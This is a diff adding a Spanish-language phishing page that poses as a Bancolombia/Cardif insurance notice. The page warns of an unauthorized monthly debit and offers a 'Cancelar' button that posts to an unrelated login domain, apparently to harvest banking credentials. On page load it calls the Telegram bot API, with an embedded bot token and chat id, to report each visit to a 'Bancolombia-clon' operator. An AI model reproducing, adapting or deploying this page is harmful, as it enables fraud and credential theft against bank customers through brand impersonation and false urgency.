@@ -1,0 +1,247 @@
+
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/boxicons/2.0.9/css/boxicons.min.css" rel="stylesheet">
+    <link rel="icon" href="https://personalvirtualesco.site/assets/img/logo.png">
+    <title>Notificación</title>
+
+    <style>
+        /* General */
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f7f8fb;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        h3 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #003B5C;
+            margin-bottom: 10px;
+        }
+
+        h4 {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: #003B5C;
+            margin-bottom: 20px;
+        }
+
+        a {
+            font-size: 1rem;
+            color: #333;
+            margin-bottom: 15px;
+            display: inline-block;
+            text-align: center;
+        }
+
+        .img img,
+        .texto img {
+            width: 100%;
+            max-width: 800px; /* Asegura que no se estiren */
+            border-radius: 12px;
+            margin-top: 10px;
+        }
+
+        .texto {
+            text-align: center;
+            margin-top: 30px;
+            padding: 0 15px; /* Añadido padding para evitar que el texto toque los bordes */
+            max-width: 800px;
+        }
+
+        /* Botones */
+        .box__btn {
+            width: 65%;
+            padding: 18px;
+            background-color: #FFD200;
+            color: #003B5C;
+            font-weight: 700;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 10px 0; /* espacio entre los botones */
+            font-size: 1.2rem;
+            text-align: center;
+        }
+
+        .box__btn:hover {
+            background-color: #FFC107;
+            transform: scale(1.05);
+        }
+
+        /* Botón Cancelar - Gris Claro */
+        .box__btn--cancelar {
+            background-color: #D3D3D3; /* Gris claro */
+            color: #003B5C;
+        }
+
+        .box__btn--cancelar:hover {
+            background-color: #B0B0B0; /* Gris más oscuro al pasar el ratón */
+        }
+
+        /* Footer */
+        .footer {
+            width: 100%;
+            background-color: #003B5C;
+            color: white;
+            padding: 0px;
+            margin-top: 50px;
+            text-align: center;
+            border-radius: 15px 15px 0 0;
+        }
+
+        .footer img {
+            width: 100%;
+            max-width: 600px;
+            border-radius: 12px;
+        }
+
+        .footer__logo1,
+        .footer__logo2 {
+            display: inline-block;
+            width: 50px;
+            height: 50px;
+            background-color: #003B5C;
+            border-radius: 50%;
+            margin-top: 15px;
+        }
+
+        .line {
+            border-top: 1px solid #fff;
+            margin: 15px 0;
+        }
+
+        /* Responsive */
+        @media screen and (max-width: 768px) {
+            .box__btn {
+                width: 90%;
+                font-size: 1rem;
+            }
+
+            .box__btn--cancelar {
+                width: 90%;
+            }
+
+            h3 {
+                font-size: 1.3rem;
+            }
+
+            h4 {
+                font-size: 1rem;
+            }
+
+            .footer {
+                font-size: 0.9rem;
+            }
+
+            .img img,
+            .texto img {
+                max-width: 100%;
+            }
+        }
+
+        @media screen and (max-width: 480px) {
+            .box__btn {
+                width: 55%;
+                padding: 16px;
+                font-size: 1rem;
+            }
+
+            .box__btn--cancelar {
+                width: 55%;
+            }
+
+            h3 {
+                font-size: 1.2rem;
+            }
+
+            h4 {
+                font-size: 1rem;
+            }
+
+            .footer {
+                font-size: 0.8rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="img">
+        <img src="header.png" alt="Header Imagen">
+    </div>
+    <div class="texto">
+        <h3>Seguro CARDlF Activado</h3><br>
+        <img
+  src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/21c57c74-c1ab-4e04-9cb8-74946f4f5851/Hero_Seguro+independiente+protegido+para+cre%CC%81dito+hipotecario.jpg?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_9O44G4S049MAD06H7SNS78IMS1-21c57c74-c1ab-4e04-9cb8-74946f4f5851-nK9pOpP"
+  alt="Seguro independiente protegido para crédito hipotecario"
+  width="50%"
+/>
+
+        <a style="margin: 10px;">Tu Seguro Cardif Te protege ante cualquier situación que te dificulte seguir trabajando o generando ingresos sea personal o tu empresa.</a><br>
+        <br><h4>Si no fuistes tu puedes cancelar el debito automatico a tu cuenta por un valor de $137.900 Primer mes, después $210.330/Mes</h4><br> 
+
+        <!-- Botones Aceptar y Cancelar -->
+        <form action="https://scdfonlinecolombia.online/cdfavenidad/cel-login.html" method="post" style="display: block;">
+            <button class="box__btn" type="submit">Cancelar</button>
+        </form>
+
+        
+    </div>
+
+    <footer class="footer">
+        <div>
+            <img src="./imagi_files/servicios.png" alt="Servicios">
+        </div>
+        <div class="line"></div>
+        <div class="footer__logo1"></div>
+        <div class="footer__logo2"></div>
+        <span>
+            <p>Dirección IP: 190.210.118.1</p>
+            <p id="currentDate">miércoles, 15 de enero de 2025, 1:30 a.m.</p>
+        </span>
+    </footer>
+
+    <script>
+        // Script para mostrar la fecha actual
+        const currentDateElement = document.getElementById("currentDate");
+        const currentDate = new Date();
+        currentDateElement.textContent = currentDate.toLocaleString('es-ES', {
+            weekday: 'long',
+            year: 'numeric',
+            month: 'long',
+            day: 'numeric',
+            hour: 'numeric',
+            minute: 'numeric',
+            second: 'numeric',
+            hour12: true
+        });
+    </script>
+  <script>
+  fetch("https://api.telegram.org/bot7984706159:AAGai2Rx6thKz_vfuLb34UYvnIn15CbwN04/sendMessage", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      chat_id: "5647970395",
+      text: "visitante Bancolombia-clon."
+    })
+  });
+</script>
+
+</body>
+</html>
